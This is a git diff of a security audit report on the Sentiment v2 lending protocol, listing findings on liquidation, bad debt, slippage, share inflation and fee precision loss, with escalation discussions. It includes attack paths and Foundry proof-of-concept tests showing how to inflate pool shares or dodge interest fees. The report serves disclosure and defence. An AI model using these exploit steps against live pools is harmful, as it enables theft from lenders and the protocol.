-As we can see, the health of the position decreases further rather than restoring it to a healthy state. This worsens the situation and prevents the position from being brought back to a healthy state, leading to a revert.
-
-Therefore, this creates a situation where the position becomes unliquidatable.
-
-
-## Impact
-Some positions cannot be liquidated, resulting in losses for the lender.
-
-## Code Snippet
-https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/main/protocol-v2/src/PositionManager.sol#L430
-## Tool used
-
-Manual Review
-
-## Recommendation
-The liquidation process should be allowed as long as it does not worsen the health of the position, even if it doesn’t fully restore the position to a healthy state. This would help minimize losses for the lender.
-
-# Issue M-27: Under certain circumstances bad debt will cause first depositor to lose funds 
-
-Source: https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/319 
-
-## Found by 
-EgisSecurity
+A2-security, EgisSecurity, Nihavent, S3v3ru5, hash
 ### Summary
 The protocol handles bad debt through [`PositionManager::liquidateBadDebt()`](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/0b472f4bffdb2c7432a5d21f1636139cc01561a5/protocol-v2/src/PositionManager.sol#L446)
 
@@ -2931,67 +3216,159 @@ None
 ### Mitigation
 Don't allow for pools to reach 100% utilization.
 
-# Issue M-28: Pool::liquidate() 
+# Issue M-15: Lack of slippage protection during withdrawal in SuperPool and Pool contracts. 
 
-Source: https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/320 
+Source: https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/356 
+
+The protocol has acknowledged this issue.
 
 ## Found by 
-EgisSecurity
-### Summary
-In lending/borrowing protocols, [liquidations](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/0b472f4bffdb2c7432a5d21f1636139cc01561a5/protocol-v2/src/PositionManager.sol#L430) are done by liquidators who are users (or bots) that liquidate positions based of an incentive. For example repaying 100$ debt and receiving 110$ in return, so they turn a 10$ profit.
+pseudoArtist, sl1
+## Summary
+Lack of slippage protection in the SuperPool and Pool could lead to loss of user funds in an event of bad debt liquidation.
+## Vulnerability Detail
+When a user who has deposited assets in one of the pools of the Pool.sol contract wishes to withdraw them, they can do so by calling `withdraw()`. Under normal conditions, user expects to receive the full deposited amount back or more if the interest accrues in the underlying pool. However, if the pool experiences bad debt liquidation, the totalAssets of the pool are reduced by the amount of bad debt liquidated and the exchange rate worsens.
+[Pool.sol#L542-L547](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/0b472f4bffdb2c7432a5d21f1636139cc01561a5/protocol-v2/src/Pool.sol#L542-L547)
+```solidity
+// rebalance bad debt across lenders
+pool.totalBorrowShares = totalBorrowShares - borrowShares;
+// handle borrowAssets being rounded up to be greater than totalBorrowAssets
+pool.totalBorrowAssets = (totalBorrowAssets > borrowAssets)
+    ? totalBorrowAssets - borrowAssets
+    : 0;
+uint256 totalDepositAssets = pool.totalDepositAssets;
+pool.totalDepositAssets = (totalDepositAssets > borrowAssets)   <<@
+    ? totalDepositAssets - borrowAssets  <<@
+    : 0;
+```
+When a user withdraws, if the pool experiences bad debt liquidation, while the transaction is pending in the mempool, they will burn more shares than they expected.
 
-If there are no incentives to liquidate someone, then liquidators won't liquidate them, so it's very important to always have an incentive otherwise the protocol can incur bad debt.
+Consider the following scenario:
+* pool.totalAssets = 2000.
+* pool.totalShares = 2000.
+* Bob wants to withdraw 500 assets, expecting to burn 500 shares.
+* While Bob's transaction is pending in the mempool, the pool experiences a bad debt liquidation and `totalAssets` drops to 1500.
+* When Bob's transaction goes through, he will burn `500 * 2000 / 1500 = 666.66` shares.
 
-In Sentiment there are several ways for liquidators to not have an incentive to liquidate an unhealthy position.
+The same issue is present in the SuperPool contract, as the `totalAssets()` of the SuperPool is dependant on the total amount of assets in the underlying pools a SuperPool has deposited into.
 
-1. Dust positions: A user can have a position with up to 5 dust loans. In this situation the gas that the liquidator has to pay (especially on mainnet) will outweigh the amount of collateral they will receive in return for repaying the loan.
-2. User gets his collateral blacklisted: If position has collateral which supports blacklisting like USDC/USDT, which are both supported by the protocol. If the position is blacklisted, then the collateral cannot be transferred, so the liquidator won't be able to receive it, thus tanking his incentive significantly.
-3. Liquidation fee: The protocol implements a liquidation fee, which is a % of the collateral that goes to the `owner()` when a position gets liquidated. When the fee is applied, there might not be enough tokens as an incentive for the liquidator, in extreme cases he might even lose money if he liquidates a position.
-4. Very high LTV assets: The protocol has provided [these example values](https://gist.github.com/ruvaag/58c9fc2e5c139451c83c21fda27b77a2). We can see that WETH has 95% LTV. This means that the liquidator can get a max discount of 5%, trying to get the full 10% discount is impossible since there won't be enough tokens in the position. This combined with a smaller loan and higher gas costs diminish the incentive for liquidations.
+[SuperPool.sol#L180-L189](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/0b472f4bffdb2c7432a5d21f1636139cc01561a5/protocol-v2/src/SuperPool.sol#L180-L189)
+```solidity
+function totalAssets() public view returns (uint256) {
+    uint256 assets = ASSET.balanceOf(address(this));
+    uint256 depositQueueLength = depositQueue.length;
+    for (uint256 i; i < depositQueueLength; ++i) {
+        assets += POOL.getAssetsOf(depositQueue[i], address(this));
+    }
+    return assets;
+}
+```
+[Pool.sol#L218-L227](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/0b472f4bffdb2c7432a5d21f1636139cc01561a5/protocol-v2/src/Pool.sol#L218-L227)
+```solidity
+function getAssetsOf(
+    uint256 poolId,
+    address guy
+) public view returns (uint256) {
+    PoolData storage pool = poolDataFor[poolId];
+    (uint256 accruedInterest, uint256 feeShares) = simulateAccrue(pool);
+    return
+        _convertToAssets(
+            balanceOf[guy][poolId],
+            pool.totalDepositAssets + accruedInterest,
+            pool.totalDepositShares + feeShares,
+            Math.Rounding.Down
+        );
+}
+```
+When redeeming in the SuperPool, a user will either burn more shares when using `withdraw()` or receive less assets when using `redeem()`.
+## Impact
+`withdraw()` in the Pool.sol and both `redeem`/`withdraw` in the SuperPool lack slippage protection, which can lead to users loosing funds in the even of bad debt liquidation.
+## Code Snippet
+https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/0b472f4bffdb2c7432a5d21f1636139cc01561a5/protocol-v2/src/Pool.sol#L339-L372
+https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/0b472f4bffdb2c7432a5d21f1636139cc01561a5/protocol-v2/src/SuperPool.sol#L281-L286
+https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/0b472f4bffdb2c7432a5d21f1636139cc01561a5/protocol-v2/src/SuperPool.sol#L293-L298
+## Tool used
 
-Example of point 3:
-I'll be using $ values to simplify the example:
+Manual Review
 
-1. Liquidation fee is 20%.
-2. Position has USDC as collateral with 90% LTV.
-3. The position has 100$ collateral and their debt is 92$ so they can be liquidated.
-4. The liquidator is expecting to pay 92$ of debt and retrieve 100$ worth of collateral, netting a 8$ profit.
-5. But because of the 20% liquidation fee, he will actually receive 80$ worth of collateral, since 20$ (20%) go to the owner as part of the liquidation fee. In this case he will actually lose 12$ for repaying the debt, which he obviously won't do.
+## Recommendation
+Introduce minimum amount out for `redeem()` function and maximum shares in for `withdraw()` function as means for slippage protection.
 
 
-### Root Cause
-There are several causes:
-1. Allowing `minDebt` and `minBorrow` to be 0 or a very small value. The README of the contest states:
-> Min Debt = from 0 to 0.05 ETH = from 0 to 50000000000000000 Min Borrow = from 0 to 0.05 ETH
-2. Collateral with high LTV (~90% and up) and higher liquidation fee diminish the incentive for liquidations substantially and can even cause loses.
-> Min LTV = 10% = 100000000000000000 Max LTV = 98% = 980000000000000000
-> Liquidation Fee = 0 (Might be increased to 20-30% in the future)
-3. Higher liquidation fees.
 
-### Internal pre-conditions
-One or all of the following, they can all cause the lack of incentive:
-1. `minDebt` and `minBorrow` equal 0 or a very small number.
-2. High LTV assets.
-3. Liquidation fee combined with a relative LTV.
+## Discussion
 
-### External pre-conditions
-None
+**z3s**
 
-### Attack Path
-None
+Slippage protection cannot circumvent bad debt
 
-### Impact
-No incentive to liquidate positions, which can lead to bad debt and loss of funds for users in the long run.
+**kazantseff**
 
-### PoC
-None
+Escalate,
+This issue and #245 should be valid. Slippage protection is not used to circumvent bad debt, but to protect users from loosing value when bad debt occurs.
 
-### Mitigation
-Enforce a higher `minDebt` and `minBorrow`. Enforce a smaller or no liquidation fee. Decrease max allowed LTV.
+**sherlock-admin3**
 
-# Issue M-29: Liquidators may repay a position's debt to pools that are within their risk tolerance, breaking the concept of isolated risk in base pools 
+> Escalate,
+> This issue and #245 should be valid. Slippage protection is not used to circumvent bad debt, but to protect users from loosing value when bad debt occurs.
+
+You've created a valid escalation!
+
+To remove the escalation from consideration: Delete your comment.
+
+You may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.
+
+**ruvaag**
+
+This should be invalid and not a duplicate of #245 because the title and description are not coherent.
+
+While the title talks about slippage during withdraw / deposits (which is a separate issue), the description talks about funds lost due to a bad debt liquidation which has nothing to do with slippage
+
+**kazantseff**
+
+For slippage to occur, the totalAssets of the pool must reduce and exchange rate worsen, this can happen during bad debt liquidation. Otherwise there won't be any slippage as the exchange rate will stay 1:1 and there won't be a need for slippage protection at all.
+
+**cvetanovv**
+
+Watson has identified an edge case where the user could receive fewer shares than expected during a bad debt liquidation. 
+
+In the event of a bad debt liquidation, the pool's total assets decrease, causing the exchange rate to worsen. If a user attempts to withdraw or redeem during this period, they can burn more shares or receive fewer assets than anticipated.
+
+I am planning to accept the escalation and make this issue Medium.
+
+**samuraii77**
+
+@cvetanovv, hello, could #292 be considered a duplicate? It is for a different functionality in a different part of the code but the root cause is the same and the impact is very similar.
+
+**cvetanovv**
+
+I can't duplicate them because they have nothing in common.
+
+The problem here is that a user can get fewer tokens when using `redeem()` or `withdrawal()` in the event of a bad debt liquidation.
+
+There is nothing like that mentioned in #292. Usually, bots liquidate, and even if a user does it, he is not obliged to do it. 
+Moreover, everything is different. Different parts of the code. Different fix. The root cause here is the lack of slippage on the bad debt liquidation event. This root cause is missing at #292.
+
+Therefore, I will not duplicate them, and my previous [decision](https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/356#issuecomment-2386520953) will remain.
+
+**WangSecurity**
+
+Result:
+Medium
+Has duplicates 
+
+**sherlock-admin2**
+
+Escalations have been resolved successfully!
+
+Escalation status:
+- [kazantseff](https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/356/#issuecomment-2354756517): accepted
+
+# Issue M-16: Liquidators may repay a position's debt to pools that are within their risk tolerance, breaking the concept of isolated risk in base pools 
 
 Source: https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/382 
+
+The protocol has acknowledged this issue.
 
 ## Found by 
 HHK, Nihavent
@@ -3183,12 +3560,12 @@ Manual Review
 - So I recommend we allow the liquidation of debt from fixedRatePool but not linearRatePool. This makes sense as fixedRatePool was the pool who opted for a riskier LTV.
 - This solution is consistent with the idea of isolated pool risk settings and a trustless model between the owners of base pools
 
-# Issue M-30: Base pools can get bricked if depositors pull out 
+# Issue M-17: Base pools can get bricked if depositors pull out 
 
 Source: https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/400 
 
 ## Found by 
-000000, A2-security, ThePharmacist
+000000, A2-security, HHK, ThePharmacist
 ### Summary
 
 In case depositors pull their funds out of the pool, due to rounding, there can be `TotalDepositAssets > 0` while `TotalDepositShares == 0`. This would completely brick the `deposit` function of the pool and the pool would not be functional anymore. This can lead to attackers being able to disable a pool since the start of it's initialization.
@@ -3403,1228 +3780,1491 @@ function testCanBrickPool() public {
 
 The protocol should check and only allow state transitions that make `assets` or `shares` 0 only if the other one is also 0.
 
-# Issue M-31: Share inflation on base pools can cause heavy losses to users 
 
-Source: https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/427 
+
+## Discussion
+
+**S3v3ru5**
+
+Good one 👍 
+
+# Issue M-18: Protocol's interestFees + Interest in a pool can be lost because of precision loss when using low-decimal assets like USDT/USDC. 
+
+Source: https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/448 
 
 ## Found by 
-HHK, Obsidian, ThePharmacist, Tomas0707, smbv-1923, vatsal
-### Summary
+valuevalk
+## Summary
+**Lenders**/**Borrowers** can intentionally lend/borrow low amounts of assets in short periods of time to avoid **"paying the protocol"** the `interestFee`, when using 6 decimal asset such as USDT/USDC.
 
-Users can deposit and borrow from pools in Sentiment v2 which calculates each user's balance through an Asset and Share system. By it's nature, Assets are supposed to always grow (in case there are no bad debts), and therefore are larger in value than shares. However, malicious users can heavily inflate each share, and can cause miscalculations due to rounding errors. This would effect pools with less underlying decimal asset in a way that 1- The fee paid to the pool can br bricked easily 2- the users that deposit can lose money due to loss of precision.
+Those issues could also happen unintentionally if there is just a constant volume of transactions for relatively low amounts.
 
-### Root Cause
+## Vulnerability Detail
+Lenders could also benefit as the `feeShares` are not minted and added to the `Pool.totalDepositShares`, thus the shares of the Lenders keep their value.
 
-- In [`Pool:381`](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/0b472f4bffdb2c7432a5d21f1636139cc01561a5/protocol-v2/src/Pool.sol#L381-L383), and [`FixedRateModel.sol:33`](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/0b472f4bffdb2c7432a5d21f1636139cc01561a5/protocol-v2/src/irm/FixedRateModel.sol#L33) the accrual is always rounded up.
-- In the documentation, it is said that `Min Debt = from 0 to 0.05 ETH = from 0 to 50000000000000000`. While this attack is possible for all `minDebts` in this range, we will consider that `Min Debt = 0` to explore the most extreme case. Consider that by increasing the amount of `MinDebt` this attack would be much less feasible.
-- In [`Pool.sol`](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/0b472f4bffdb2c7432a5d21f1636139cc01561a5/protocol-v2/src/Pool.sol#L381), the value `interestAccrued` is in base asset's decimals, which means for USDC/USDT, this amount would be only 6 decimals. This makes the share inflation attack way more feasible on such low decimal tokens.
+Borrower's ability can be limited to perform the attack, if the `Pool.minBorrow` amount is set high enough, though precision loss could still occur. BUT, Lenders do not have such limitations.
 
-### Internal pre-conditions
+Additionally, its also likely to have precision loss in the whole InterestAccrued itself, which benefits **Borrowers**, at the expense of **Lenders**.
 
-N/A
+## Impact
+The protocol continuously loses the `interestFee`, due to precision loss. 
 
-### External pre-conditions
+**Lenders** could do this in bulk with low-value amounts when borrowing to avoid fees to the protocol when depositing. 
 
-1- since the inflation happens through accruals in each block, the attacker should not be interrupted during the process. In case of interruptions, attacker can start to work on a new pool.
+If `minBorrow` is set low enough **Borrowers** can intentionally do it too.
 
-### Attack Path
+Since the protocol would be deployed on other **EVM-compatible** chains, the impact would be negligible when performed on L2s and potentially on Ethereum if gas fees are low.
 
-The goal of the Attacker is to inflate each share and map each 1 share to a much higher amount of Asset.
-Here, we consider that the attacker is not going to be interrupted during the process, and also consider `minDebt == 0`.
-1- The attacker deposits 1 asset into the protocol, bringing `totalDepositAssets` and `totalDepositShares` both to 1.
-2- The attacker borrows the 1 asset from the protocol, bringing `totalBorrowAssets` and `totalBorrowShares` both to 1, also setting the utilization to 100 percent.
-3- attacker starts accruing with each block, after the first accrual, [`Pool:407`](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/0b472f4bffdb2c7432a5d21f1636139cc01561a5/protocol-v2/src/Pool.sol#L407-L409) adds to the Assets, inflating them in the process. `feeShares` is usually zero due to rounding down and small amounts in the process.
-4- After the first accrual, `totalDepositAssets` and `totalBorrowAssets` are set to 2, while the shares remain in the previous value.
-5- Attacker can continue and do this for a day, after `(24*3600)/12 = 7200 times`, can bring asset/share to `7201`.
-6- After the second day and `14400` times of accrual, bringing asset/share ratio to `14400`. (Attacker can get achieve bigger numbers if they continue doing this)
-7- At this point, every deposit or borrow from users would be rounded down/up by 14400. A victim can deposit `14400 * 2 - 1` assets and would only receive 1 share, basically sharing `14400 - 1` with the rest of the pool. 
-8 - This would especially effect the pools with less decimal values such as `USDC` and `USDT`.
+The losses could be significant, when compounding overtime.
 
-### Impact
-
-- Fees to the protocol will shutdown after a certain ratio is reached. Since [`interestAccrued`](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/0b472f4bffdb2c7432a5d21f1636139cc01561a5/protocol-v2/src/Pool.sol#L381-L383) is small each time and protocol [fees are rounded down twice](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/0b472f4bffdb2c7432a5d21f1636139cc01561a5/protocol-v2/src/Pool.sol#L387-L395), protocol lenders can use such tricks and accrue frequently to avoid paying any fees to the protocol owner.
-- The share inflation can cause loss of funds to both lenders and borrowers, and a malicious user with correct inputs that do not lose value due to precision loss can steal funds from other people in such systems.
-- The internal bookkeeping of the protocol would be incorrect.
-
-### PoC
-
-The output of the test is:
-```text
-  ================
-  One day of constant accrual
-  Total Borrow Assets:  7201
-  Total Borrow Shares:  1
-  Total Deposit Assets:  7201
-  Total Deposit Shares:  1
-  ================
-  Two days of constant accrual
-  Total Borrow Assets:  14401
-  Total Borrow Shares:  1
-  Total Deposit Assets:  14401
-  Total Deposit Shares:  1
-  ================
-  Total Borrow Assets:  14401
-  Total Borrow Shares:  1
-  Total Deposit Assets:  43202
-  Total Deposit Shares:  2
-  ================
-```
-PoC:
+## Code Snippet
+accrue() is called in [deposit()](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/main/protocol-v2/src/Pool.sol#L315) and [borrow()](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/main/protocol-v2/src/Pool.sol#L432)
+And it saves the `pool.lastUpdated `, every time its called.
 ```solidity
-   function testInflateShares() public {
-        address attacker = makeAddr("Attacker");
-        address victim = makeAddr("Victim");
-        address liquidator = makeAddr("Liquidator");
+    function accrue(PoolData storage pool, uint256 id) internal {
+        (uint256 interestAccrued, uint256 feeShares) = simulateAccrue(pool);
+        if (feeShares != 0) _mint(feeRecipient, id, feeShares);
+        
+        pool.totalDepositShares += feeShares;
+        pool.totalBorrowAssets += interestAccrued;
+        pool.totalDepositAssets += interestAccrued;
 
+        // store a timestamp for this accrue() call
+        // used to compute the pending interest next time accrue() is called
+ @>>    pool.lastUpdated = uint128(block.timestamp);
+    }
+```
+So upon the next call we will use that timestamp in the `simulateAccrue()`. 
+However  `interestAccrued.mulDiv(pool.interestFee, 1e18);` loses precision when using low-decimal assets such as `USDT/USDC`, and if its called within short period of times like 1-60 seconds it can even end up being 0, and since `pool.lastUpdated` is updated, the lost amounts cannot be recovered the next time `accrue()` is called.
+```solidity
+    function simulateAccrue(PoolData storage pool) internal view returns (uint256, uint256) {
+@>>     uint256 interestAccrued = IRateModel(pool.rateModel).getInterestAccrued(
+@>>         pool.lastUpdated, pool.totalBorrowAssets, pool.totalDepositAssets
+        );
+
+        uint256 interestFee = pool.interestFee;
+        if (interestFee == 0) return (interestAccrued, 0);
+@>>     uint256 feeAssets = interestAccrued.mulDiv(pool.interestFee, 1e18);
+        
+       .........
+```
+      
+## Proof of Concept
+In BaseTest.t.sol set interestFee to 10% of the Interest.
+```diff
+            badDebtLiquidationDiscount: 1e16,
+            defaultOriginationFee: 0,
+-           defaultInterestFee: 0
++          defaultInterestFee: 0.1e18
+        });
+```
+and make asset1 have 6 decimals, as USDT/USDC
+```diff
+-       asset1 = new MockERC20("Asset1", "ASSET1", 18);
++      asset1 = new MockERC20("Asset1", "ASSET1", 6);
+        asset2 = new MockERC20("Asset2", "ASSET2", 18);
+        asset3 = new MockERC20("Asset3", "ASSET3", 18);
+```
+Changes in PositionManager.t.sol
+```diff
         vm.startPrank(protocolOwner);
-        riskEngine.setOracle(address(asset1), address(asset3Oracle)); // 1:1 with Eth
-        riskEngine.setOracle(address(asset2), address(asset3Oracle)); // 1:1 with Eth
+        riskEngine.setOracle(address(asset1), address(asset1Oracle));
+        riskEngine.setOracle(address(asset2), address(asset2Oracle));
+        riskEngine.setOracle(address(asset3), address(asset3Oracle));
         vm.stopPrank();
 
-        MockERC20 borrowAsset = asset1; 
-        MockERC20 collateralAsset = asset2;
-        uint256 amountOfAsset = 1_000 ether;
-        uint256 vicPoolId;
-        address attPosition;
-        bytes memory data;
-        Action memory action;
+-       asset1.mint(address(this), 10_000 ether);
+-       asset1.approve(address(pool), 10_000 ether);
++       asset1.mint(address(this), 10_000e6);
++       asset1.approve(address(pool), 10_000e6);
 
-        /**
-        * =============================
-        *           SETUP
-        * =============================
-         */
-        {
-            // == Minting assets to actors
-            borrowAsset.mint(attacker, amountOfAsset);
-            collateralAsset.mint(attacker, amountOfAsset);
+-       pool.deposit(linearRatePool, 10_000 ether, address(0x9));
++       pool.deposit(fixedRatePool2, 10_000e6, address(0x9));
 
-            borrowAsset.mint(victim, amountOfAsset);
-            collateralAsset.mint(victim, amountOfAsset);
+        Action[] memory actions = new Action[](1);
+        (position, actions[0]) = newPosition(positionOwner, bytes32(uint256(3_492_932_942)));
 
-            borrowAsset.mint(liquidator, amountOfAsset);
-            // == Finish minting assets
+        PositionManager(positionManager).processBatch(position, actions);
 
-            // == Making the position
-            vm.startPrank(attacker);
-            bytes32 salt = bytes32(uint256(98));
-            address owner = attacker;
-            data = abi.encodePacked(owner, salt);
-            (attPosition,) = protocol.portfolioLens().predictAddress(owner, salt);
-            action = Action({ op: Operation.NewPosition, data: data });
-            positionManager.process(attPosition, action);
-            vm.stopPrank();
+        vm.startPrank(poolOwner);
+       riskEngine.requestLtvUpdate(linearRatePool, address(asset3), 0.75e18);
+       riskEngine.acceptLtvUpdate(linearRatePool, address(asset3));
+-       riskEngine.requestLtvUpdate(linearRatePool, address(asset2), 0.75e18);
+-       riskEngine.acceptLtvUpdate(linearRatePool, address(asset2));
++       riskEngine.requestLtvUpdate(fixedRatePool2, address(asset2), 0.75e18);
++       riskEngine.acceptLtvUpdate(fixedRatePool2, address(asset2));
+        vm.stopPrank();
+```
 
-            vm.startPrank(positionManager.owner());
-            positionManager.toggleKnownAsset(address(borrowAsset));
-            // positionManager.toggleKnownAsset(address(collateralAsset)); // Already a known asset
-            vm.stopPrank();
-            // == Finish making the position
+Add the code bellow in the PositionManager.t.sol and run `forge test --match-test testZeroFeesPaid -vvv`
+```solidity
+    function testZeroFeesPaid() public {
+        //===> Assert 0 total borrows <===
+        assertEq(pool.getTotalBorrows(fixedRatePool2), 0);
 
-            // == victim making the pool
-            // // ==== Setting the rateModel
-            address rateModel = address(new LinearRateModel(1e18, 2e18));
-            bytes32 RATE_MODEL_KEY = 0xc6e8fa81936202e651519e9ac3074fa4a42c65daad3fded162373ba224d6ea96;
-            vm.prank(protocolOwner);
-            registry.setRateModel(RATE_MODEL_KEY, rateModel);
-            // // ==== Finished Setting the rate model
-            vm.startPrank(victim);
-            vicPoolId = pool.initializePool(
-                victim, // owner
-                address(borrowAsset), // asset to use
-                1e30, // pool cap
-                RATE_MODEL_KEY // rate model key in registry
-                );
-            // // ==== Setting the LTV
-            riskEngine.requestLtvUpdate(vicPoolId, address(collateralAsset), 0.95e18); // Using the same asset to borrow one in this case
-            riskEngine.acceptLtvUpdate(vicPoolId, address(collateralAsset));
-            // // ==== Finish setting the LTv
-            vm.stopPrank();
-            // == Finished making the pool
+        //===> Borrow asset1 <===
+        testSimpleDepositCollateral(1000 ether);
+        borrowFromFixedRatePool();
+        assertEq(pool.getTotalBorrows(fixedRatePool2), 5e6); // Borrow 5 USDT ( can be more, but delay has to be lower )
 
-            // == Attacker setting up the position
-            vm.startPrank(attacker);
-            data = abi.encodePacked(address(collateralAsset));
-            action = Action({ op: Operation.AddToken, data: data });
-            positionManager.process(
-                attPosition,
-                action
-            );
-            collateralAsset.transfer(address(attPosition), amountOfAsset/2);
-            vm.stopPrank();
-            // == Finish Attacker setting up the position
-        }
+        //===> Skip 45 seconds of time, and borrow again, to call accrue and mint feeShares. <===
+        skip(45);
+        //Note: This could also be done using deposit (i.e. from Lenders), since we only care about the accrue function.
+        borrowFromFixedRatePool();
 
-        /**
-        * =============================
-        *           EXPLOIT
-        * =============================
-         */
+        // Verify that feeShares minted are 0. So we lost fees between the two borrows.
+        assertEq(pool.getAssetsOf(fixedRatePool2, address(this)), 0);
 
-        logPoolData(vicPoolId, attPosition);
+        //===> Try longer period low amounts of feeInterest should accrue. <===
+        skip(300);
+        borrowFromFixedRatePool();
+        assertEq(pool.getAssetsOf(fixedRatePool2, address(this)), 18);
+    }
+
+    function borrowFromFixedRatePool() public {
+        vm.startPrank(positionOwner);
+        bytes memory data = abi.encode(fixedRatePool2, 5e6);
+
+        Action memory action = Action({ op: Operation.Borrow, data: data });
+        Action[] memory actions = new Action[](1);
+        actions[0] = action;
+        PositionManager(positionManager).processBatch(position, actions);
+    }
+```
+## Tool used
+
+Manual Review
+
+## Recommendation
+The core cause is that the RateModels when accounting for low-decimal assets, for short-periods of time they return low values which leads to 0 interestFee.
+
+A possible solution to fix that would be to scale up the totalBorrowAssets and totalDepositAssets to always have 18 decimals, no matter the asset.
+
+Thus avoiding `uint256 feeAssets = interestAccrued.mulDiv(pool.interestFee, 1e18);` resuling in 0, due to low interestAccrued.
+
+This will also fix possible precision loss from interestAccrued itself, as **we could also lose precision in the RateModels**, which could compound and result in getting less interest, than it should be.
+
+Additionally, consider adding a minimum deposit value.
+
+
+
+## Discussion
+
+**MrValioBg**
+
+This issue is valid. The PoC shows the vulnerability. @z3s  
+
+We set the interest fee to 10% - as specified in the readme, admin will set it from 0 to 10, so its a valid value, the highest one is used, to show the biggest impact - [reference](https://github.com/sherlock-audit/2024-08-sentiment-v2?tab=readme-ov-file#q-are-there-any-limitations-on-values-set-by-admins-or-other-roles-in-the-codebase-including-restrictions-on-array-lengths)
+
+The problem arises from the loss of precision when using USDT/USDC. 
+If there is low totalBorrowedAmount, about 5-10USDT/USDC
+The first interactions with the pool that result in calling `simulateAccrue()` could lead to 100% loss of the interestFees, as demonstrated in the **PoC**.
+
+```solidity
+        //===> Skip 45 seconds of time, and borrow again, to call accrue and mint feeShares. <===
+        skip(45);
+        //Note: This could also be done using deposit (i.e. from Lenders), since we only care about the accrue function.
+        borrowFromFixedRatePool();
+        
+         // Verify that feeShares minted are 0. So we lost fees between the two borrows.
+        assertEq(pool.getAssetsOf(fixedRatePool2, address(this)), 0);
+```
+
+As you can see, for 45 seconds, no fee is accrued due to the precision loss, but when you call accrue, you actually save a "checkpoint," which basically leads to resetting the point from where the fees accrue. 
+Thus, it will mean that the frequent interactions could lead to the interestFees to be 100% lost, as there won't be enough time for the precision loss to be reduced, rounding them to 0.
+
+--------
+**Additional info:**
+If we set the interestFee to 2%, which is a possible value according to the Readme, it will take over 250 seconds, to get to over the rounding to 0. ( for 1%, which is also a valid value, it will take about 8-10 mins).
+
+We would still lose great amount of fee due to precision loss, even if the pool borrow size increases, it would just be less than 100% loss, 100% might still be possible, but the time delay needed may be reduced.
+
+For example with a pool with 1K borrow amount, it takes around 3sec to delay to round down the interestFee to 0, over the 3 sec mark, precision is still lost, and less interestFees are accrued, its just less than 100%
+
+**ZdravkoHr**
+
+Escalate
+On behalf of @MrValioBg 
+
+**sherlock-admin3**
+
+> Escalate
+> On behalf of @MrValioBg 
+
+You've created a valid escalation!
+
+To remove the escalation from consideration: Delete your comment.
+
+You may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.
+
+**cvetanovv**
+
+@z3s @ruvaag can I have your opinion?
+
+**cvetanovv**
+
+@MrValioBg The PoC test only works at low borrow values. As soon as I tried using larger values, it did not work. Can you provide a working PoC test with normal values?
+Because precision lost on a borrow of 5 USDT is no more than low/info severity.
+
+**MrValioBg**
+
+> @MrValioBg The PoC test only works at low borrow values. As soon as I tried using larger values, it did not work. Can you provide a working PoC test with normal values? Because precision lost on a borrow of 5 USDT is no more than low/info severity.
+
+Of course. Will get back to you with a realistic scenario which also reflects realistic market interest rates.
+
+**MrValioBg**
+
+@cvetanovv  
+Giving a realistic example. The issue here is valid for pools with borrow amounts which is in the thousands, they can lose very high % of the interestFee, due to precision loss when using `USDC/USDT`.
+
+My last PoC used unrealistic interest rate, as we used fixedPoolRate2 which had `2e18` RATE set representing 200% interest rate per year. 
+A realistic one is like `1-3%` per year, as we can see what the competitive market offers:
+https://www.explorer.euler.finance/ 
+https://app.euler.finance/
+https://app.aave.com/markets/
+
+A pool with a realistic total borrows amount is `2000$`, on such pools we could realistically have about `5-10k$` of liquidity deposited.
+
+Setting the `interestFee to 1%` ( [reference](https://github.com/sherlock-audit/2024-08-sentiment-v2?tab=readme-ov-file#q-are-there-any-limitations-on-values-set-by-admins-or-other-roles-in-the-codebase-including-restrictions-on-array-lengths) ) in BaseTest.t.sol
+```diff
+    function setUp() public virtual {
+        Deploy.DeployParams memory params = Deploy.DeployParams({
+            owner: protocolOwner,
+            proxyAdmin: proxyAdmin,
+            feeRecipient: address(this),
+            minLtv: 2e17, // 0.1
+            maxLtv: 8e17, // 0.8
+            minDebt: 0,
+            minBorrow: 0,
+            liquidationFee: 0,
+            liquidationDiscount: 200_000_000_000_000_000,
+            badDebtLiquidationDiscount: 1e16,
+            defaultOriginationFee: 0,
+-           defaultInterestFee: 0
++           defaultInterestFee: 0.01e18
+        });
+ ```       
+
+And in BaseTest.t.sol, again set the annual interest rate for borrowers to 1.5% ( Previous value of 200% is not realistic to the market )
+```diff
+        address fixedRateModel = address(new FixedRateModel(1e18));
+        address linearRateModel = address(new LinearRateModel(1e18, 2e18));
+-       address fixedRateModel2 = address(new FixedRateModel(200e18)); 
++       address fixedRateModel2 = address(new FixedRateModel(0.015e18)); // set interest rate to 1.5%
+        address linearRateModel2 = address(new LinearRateModel(2e18, 3e18));
+```
+
+Additionally we still need to do the changes in setUp() and in BaseTest.t.sol from the original PoC, which are related to the 6 decimal change, which comes from using either USDT or USDC.
+Then we can run the adjusted **PoC**:
+```solidity
+    function testZeroFeesPaid() public {
+        //===> Assert 0 total borrows <===
+        assertEq(pool.getTotalBorrows(fixedRatePool2), 0);
+
+        //===> Setup <===
+        testSimpleDepositCollateral(200_000 ether);
